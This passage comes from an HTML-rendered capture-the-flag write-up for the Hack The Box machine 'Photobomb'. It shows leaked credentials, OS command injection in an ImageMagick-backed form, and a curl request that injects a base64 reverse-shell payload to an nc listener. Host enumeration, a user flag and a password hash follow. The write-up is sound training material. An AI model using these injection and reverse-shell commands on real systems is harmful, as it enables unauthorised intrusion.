+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">            <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">setAttribute</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>href<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>http://pH0t0:b0Mb!@photobomb.htb/printer<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-function z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span>
+</span><span class="z-source z-ts"><span class="z-support z-variable z-dom z-ts">window</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">onload</span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-readwrite z-ts">init</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></code></pre>
+<p>It checks if the request to the homepage contains a <code>isPhotoBombTechSupport</code>
+cookie. If it does, it changes the link to <code>/printer</code> by prepopulating it with
+the <code>pH0t0</code>:<code>b0Mb!</code> credentials.</p>
+<p>According to the comment of this script, it's meant to help tech support as they
+keep forgetting the credentials, but this will be of tremendous help for us.</p>
+<h4 id="exploration-2">Exploration</h4>
+<p>Let's browse once again to <code>/printer</code>, and let's authenticate with the
+credentials we just found.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/photobomb/domain-printer-page.png" alt="Domain printer page" /></p>
+<p>We are served a web page containing several images. We can select one of them,
+as well as a file type between PNG and JPG and an image dimension. Then, we can
+send the form to download the image we selected in the specified dimension and
+format.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>If we check the previous requests using Burp Suite, we notice that when we press
+the 'Download photo to print' button to submit the form, a POST message is sent
+to <code>/printer</code> with the data:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">photo=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">IMAGE_LINK</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>&amp;filetype=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">FILETYPE</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>&amp;dimensions=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">WIDTH</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>x<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">HEIGHT</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>I replayed this request on Burp Suite to study the behavior of the website.</p>
+<p>If I send an invalid <code>photo</code> parameter, the response is
+'Source photo does not exist.'. However, I can freely edit the <code>filetype</code> and
+<code>dimensions</code> parameters, as long as <code>filetype</code> is prefixed with <code>png</code> or <code>jpg</code>,
+and <code>dimensions</code> are valid.</p>
+<p>If we add <code>.txt</code> after the <code>filetype</code> value, the response is like this:</p>
+<pre class="z-code"><code><span class="z-text z-plain"># ImageMagick pixel enumeration: 300,200,65535,srgb
+</span><span class="z-text z-plain">0,0: (1545,1204,990)  #060504  srgb(6,5,4)
+</span><span class="z-text z-plain">1,0: (1529,1056,1417)  #060406  srgb(6,4,6)
+</span><span class="z-text z-plain">2,0: (1646,1162,1980)  #060508  srgb(6,5,8)
+</span><span class="z-text z-plain">3,0: (1493,1021,1723)  #060407  srgb(6,4,7)
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Therefore, we can infer that it's using ImageMagick to convert and resize the
+image we select.</p>
+<h4 id="path-traversal">Path traversal</h4>
+<p>I tried to enter <code>../../../../../../etc/passwd</code> after the <code>photo</code> parameter, but
+the response is 'Invalid photo.'. It looks like there's some sort of validation
+for the filetype, so unfortunately we can't read any file on the filesystem.</p>
+<h4 id="os-command-injection">OS command injection</h4>
+<p>Since ImageMagick is used to convert and to resize the image we select, the
+website is likely using a Bash command with the values we enter. This means that
+we may be able to execute our own commands by adding them as a POST parameter
+value.</p>
+<p>I already tried to modify the <code>photo</code> parameter, but it's validated so we can't
+execute our own commands.</p>
+<p>The same goes for the <code>dimensions</code> parameter.</p>
+<p>However, the <code>filetype</code> parameter is considered valid as long as it starts with
+<code>jpg</code> or <code>png</code>. If we add a command after a valid prefix, the result is
+'Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg', so it
+likely worked!</p>
+<p>If we send an extra request with <code>sleep 10</code> as the command, there's a 10 seconds
+delay before we receive the response, so our OS command injection definitely
+worked!</p>
+<h2 id="foothold-os-command-injection">Foothold (OS command injection)</h2>
+<p>Since the website uses ImageMagick to dynamically convert and resize the image
+based on user-controllable inputs, and it fails to properly sanitize the
+<code>filetype</code> parameter, we can craft a payload to obtain RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's send a request to Photobomb to execute our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Authorization: Basic cEgwdDA6YjBNYiE=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://photobomb.htb/printer<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>filetype=jpg;/bin/echo <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span> | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dimensions=3000x2000<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.10] from (UNKNOWN) [10.10.11.182] 48052
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">wizard@photobomb:~/photobomb$
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
+<p>Let's use SSH to spawn a pty and to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Photobomb as <code>wizard</code>.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>wizard</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Photobomb's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Photobomb is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
+</span><span class="z-text z-plain">DISTRIB_RELEASE=20.04
+</span><span class="z-text z-plain">DISTRIB_CODENAME=focal
+</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.5 LTS&quot;
+</span></code></pre>
+<p>Okay, so it's Ubuntu 20.04.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Photobomb.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.4.0-126-generic
+</span></code></pre>
+<p>It's <code>5.4.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">wizard
+</span></code></pre>
+<p>There's <code>root</code> and <code>wizard</code> (us).</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">wizard
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 10.10.11.182  netmask 255.255.254.0  broadcast 10.10.11.255
+</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:e0ba  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:e0ba  prefixlen 64  scopeid 0x0&lt;global&gt;
+</span><span class="z-text z-plain">        ether 00:50:56:b9:e0:ba  txqueuelen 1000  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 1108  bytes 93214 (93.2 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 1000  bytes 1188345 (1.1 MB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
+</span><span class="z-text z-plain">        RX packets 1239  bytes 1204083 (1.2 MB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 1239  bytes 1204083 (1.2 MB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Photobomb's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">photobomb
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wizard@photobomb:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/wizard/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4fd9520545063d1acb5806ffd300defc
+</span></code></pre>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Nginx website, located at <code>/home/wizard/photobomb</code>.</p>
+<pre class="z-code"><code><span class="z-text z-plain">pH0t0:$apr1$dnyF00ZD$9PifZwUxL/J0BCS/wTShU1
+</span></code></pre>
+<p>The <code>.htpasswd</code> file contains HTTP credentials for the website. It corresponds
+to the <code>pH0t0</code> username, so the hash must correspond to <code>b0Mb!</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/sh</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">dirname</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">readlink</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">0</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby</span></span><span class="z-meta z-function-call z-arguments z-shell"> server.rb <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span>log/photobomb.log <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&amp;</span><span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">1</span></span>
+</span></code></pre>
+<p>The <code>photobomb.sh</code> file executes the <code>server.rb</code> file using <code>ruby</code>, and we can
+assume that it's used to start the server.</p>
+<pre data-lang="rb" class="language-rb z-code"><code class="language-rb" data-lang="rb"><span class="z-source z-ruby"><span class="z-keyword z-operator z-comparison z-ruby">&lt;</span><span class="z-variable z-other z-constant z-ruby">SNIP</span><span class="z-keyword z-operator z-comparison z-ruby">&gt;</span>
+</span><span class="z-source z-ruby">post <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>/printer<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span> <span class="z-keyword z-control z-start-block z-ruby">do</span>
+</span><span class="z-source z-ruby">    photo <span class="z-keyword z-operator z-assignment z-ruby">=</span> params<span class="z-punctuation z-section z-array z-ruby">[</span><span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>photo</span><span class="z-punctuation z-section z-array z-ruby">]</span>
+</span><span class="z-source z-ruby">    filetype <span class="z-keyword z-operator z-assignment z-ruby">=</span> params<span class="z-punctuation z-section z-array z-ruby">[</span><span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>filetype</span><span class="z-punctuation z-section z-array z-ruby">]</span>
+</span><span class="z-source z-ruby">    dimensions <span class="z-keyword z-operator z-assignment z-ruby">=</span> params<span class="z-punctuation z-section z-array z-ruby">[</span><span class="z-constant z-other z-symbol z-ruby"><span class="z-punctuation z-definition z-constant z-ruby">:</span>dimensions</span><span class="z-punctuation z-section z-array z-ruby">]</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-comment z-line z-number-sign z-ruby"><span class="z-punctuation z-definition z-comment z-ruby">#</span> handle inputs
+</span></span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> photo<span class="z-punctuation z-accessor z-dot z-ruby">.</span><span class="z-support z-function z-builtin z-ruby">match</span><span class="z-punctuation z-definition z-group z-begin z-ruby">(</span><span class="z-meta z-string z-regexp z-ruby"><span class="z-string z-regexp z-classic z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">/</span><span class="z-constant z-character z-escape z-ruby">\.</span><span class="z-meta z-string z-ruby"><span class="z-string z-regexp z-arbitrary-repetition z-ruby"><span class="z-punctuation z-definition z-arbitrary-repetition z-ruby">{</span>2<span class="z-punctuation z-definition z-arbitrary-repetition z-ruby">}</span></span></span>|<span class="z-constant z-character z-escape z-ruby">\/</span><span class="z-punctuation z-definition z-string z-end z-ruby">/</span></span></span><span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">500</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Invalid photo.<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">if</span> <span class="z-keyword z-operator z-logical z-ruby">!</span><span class="z-support z-class z-ruby">FileTest</span><span class="z-punctuation z-accessor z-dot z-ruby">.</span>exist?<span class="z-punctuation z-definition z-group z-begin z-ruby">(</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-double z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&quot;</span>source_images/<span class="z-punctuation z-definition z-string z-end z-ruby">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-ruby">+</span> photo <span class="z-punctuation z-definition z-group z-end z-ruby">)</span>
+</span><span class="z-source z-ruby">        halt <span class="z-constant z-numeric z-integer z-decimal z-ruby">500</span><span class="z-punctuation z-separator z-sequence z-ruby">,</span> <span class="z-meta z-string z-ruby"><span class="z-string z-quoted z-single z-ruby"><span class="z-punctuation z-definition z-string z-begin z-ruby">&#39;</span>Source photo does not exist.<span class="z-punctuation z-definition z-string z-end z-ruby">&#39;</span></span></span>
+</span><span class="z-source z-ruby">    <span class="z-keyword z-control z-ruby">end</span>
+</span><span class="z-source z-ruby">
